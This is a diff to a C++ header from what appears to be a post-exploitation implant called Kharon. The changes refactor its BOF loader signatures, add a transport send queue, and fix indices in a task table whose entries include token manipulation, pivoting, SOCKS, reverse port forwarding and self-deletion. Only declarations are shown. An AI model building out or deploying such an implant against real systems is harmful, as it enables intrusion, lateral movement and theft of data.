@@ -216,6 +216,8 @@ namespace Root {
         struct {
             COFF_MAPPED* Mapped;
             BOOL         IsLoaded;
+
+            INT32 SubId;
             
             PVOID fn_inject;
             PVOID fn_poll;
@@ -1092,7 +1094,7 @@ public:
         ApiTable[37] = { Hsh::Str("AxAddScreenshot"), reinterpret_cast<PVOID>(&Coff::AxAddScreenshot) },
     };
 
-    auto Add( PVOID MmBegin, PVOID MmEnd, CHAR* UUID, ULONG CmdID, PVOID Entry ) -> BOF_OBJ*;
+    auto Add( PVOID MmBegin, PVOID MmEnd, PVOID Entry ) -> BOF_OBJ*;
     auto GetTask( PVOID Address ) -> CHAR*;
     auto GetCmdID( PVOID Address ) -> ULONG;
     auto Rm( BOF_OBJ* Obj ) -> BOOL;
@@ -1101,13 +1103,11 @@ public:
     auto RslApi( _In_ PCHAR SymName ) -> PVOID;
 
     auto Loader( 
-        _In_ BYTE* Buffer, _In_ ULONG Size, _In_ BYTE* Args, 
-        _In_ ULONG Argc, _In_ CHAR* UUID, _In_ ULONG CmdID
+        _In_ BYTE* Buffer, _In_ ULONG Size, _In_ BYTE* Args, _In_ ULONG Argc
     ) -> BOOL;
 
     auto Execute(
-        _In_ COFF_MAPPED* Mapped, _In_ BYTE* Args, 
-        _In_ ULONG Argc, _In_ CHAR* UUID, _In_ ULONG CmdID 
+        _In_ COFF_MAPPED* Mapped, _In_ BYTE* Args, _In_ ULONG Argc
     ) -> BOOL;
 
     auto FindSymbol( _In_ COFF_MAPPED* Mapped, _In_ PCHAR SymName ) -> PVOID;
@@ -1234,7 +1234,6 @@ public:
 
     CHAR TunnelUUID[37]   = "00000000-0000-0000-0000-000000000001"; 
     CHAR DownloadUUID[37] = "00000000-0000-0000-0000-000000000002";
-    CHAR PostexUUID[37]   = "00000000-0000-0000-0000-000000000003"; 
 
     CHAR* CurrentUUID  = nullptr;
     ULONG CurrentCmdId = 0;
@@ -1285,6 +1284,12 @@ public:
     Package( Root::Kharon* KharonRf ) : Self( KharonRf ) {};
 
     PACKAGE* Shared = nullptr;
+
+    TRANSPORT_NODE* QueueHead  = nullptr;
+    ULONG           QueueCount = 0;
+
+    auto Enqueue( _In_ PVOID Buffer, _In_ ULONG Length ) -> VOID;
+    auto FlushQueue( VOID ) -> VOID;
 
     auto Base64( _In_ const PVOID in, _In_ SIZE_T inlen, _Out_opt_ PVOID  out, _In_opt_ SIZE_T outlen, _In_ Base64Action Action  ) -> SIZE_T;
     auto Base32( _In_ const PVOID in, _In_ SIZE_T inlen, _Out_opt_ PVOID out, _In_opt_ SIZE_T outlen, _In_ Base32Action Action ) -> SIZE_T;
@@ -1338,15 +1343,21 @@ public:
     auto Wstr( _In_ PPARSER parser, _In_ ULONG* size ) -> PWCHAR;
 };
 
-struct _HTTP_DATA {
+struct _TRANSPORT_NODE {
+    PVOID Buffer;
+    ULONG Length;
 
+    struct _TRANSPORT_NODE* Next;
 };
+typedef _TRANSPORT_NODE TRANSPORT_NODE;
 
 class Transport {    
 private:
     Root::Kharon* Self;
 public:
     Transport( Root::Kharon* KharonRf ) : Self( KharonRf ) {};
+
+    TRANSPORT_NODE* Node;
 
     struct {
         CHAR*  FileID;
@@ -1517,18 +1528,18 @@ public:
         ERROR_CODE ( Task::*Run )( JOBS* );
     } Mgmt[TSK_LENGTH] = {
         Mgmt[0].ID  = Action::Task::Exit,              Mgmt[0].Run  = &Task::Exit,
-        Mgmt[1].ID  = Action::Task::ExecBof,           Mgmt[3].Run  = &Task::ExecBof,
-        Mgmt[2].ID  = Action::Task::PostEx,            Mgmt[4].Run  = &Task::Postex,
-        Mgmt[3].ID  = Action::Task::Download,          Mgmt[5].Run  = &Task::Download,
-        Mgmt[4].ID  = Action::Task::Upload,            Mgmt[6].Run  = &Task::Upload,
-        Mgmt[5].ID  = Action::Task::Socks,             Mgmt[7].Run  = &Task::Socks,
-        Mgmt[6].ID  = Action::Task::Token,             Mgmt[8].Run  = &Task::Token,
-        Mgmt[7].ID  = Action::Task::Pivot,             Mgmt[9].Run  = &Task::Pivot,
-        Mgmt[8].ID  = Action::Task::SelfDelete,        Mgmt[10].Run = &Task::SelfDel,
-        Mgmt[9].ID  = Action::Task::Jobs,              Mgmt[14].Run = &Task::Jobs,
-        Mgmt[10].ID = Action::Task::ProcessTunnels,    Mgmt[15].Run = &Task::ProcessTunnel,
-        Mgmt[11].ID = Action::Task::ProcessDownloads,  Mgmt[16].Run = &Task::ProcessDownloads,
-        Mgmt[12].ID = Action::Task::RPortfwd,          Mgmt[17].Run = &Task::RPortfwd
+        Mgmt[1].ID  = Action::Task::ExecBof,           Mgmt[1].Run  = &Task::ExecBof,
+        Mgmt[2].ID  = Action::Task::PostEx,            Mgmt[2].Run  = &Task::Postex,
+        Mgmt[3].ID  = Action::Task::Download,          Mgmt[3].Run  = &Task::Download,
+        Mgmt[4].ID  = Action::Task::Upload,            Mgmt[4].Run  = &Task::Upload,
+        Mgmt[5].ID  = Action::Task::Socks,             Mgmt[5].Run  = &Task::Socks,
+        Mgmt[6].ID  = Action::Task::Token,             Mgmt[6].Run  = &Task::Token,
+        Mgmt[7].ID  = Action::Task::Pivot,             Mgmt[7].Run  = &Task::Pivot,
+        Mgmt[8].ID  = Action::Task::SelfDelete,        Mgmt[8].Run  = &Task::SelfDel,
+        Mgmt[9].ID  = Action::Task::Jobs,              Mgmt[9].Run  = &Task::Jobs,
+        Mgmt[10].ID = Action::Task::ProcessTunnels,    Mgmt[10].Run = &Task::ProcessTunnel,
+        Mgmt[11].ID = Action::Task::ProcessDownloads,  Mgmt[11].Run = &Task::ProcessDownloads,
+        Mgmt[12].ID = Action::Task::RPortfwd,          Mgmt[12].Run = &Task::RPortfwd
     };
 };
 
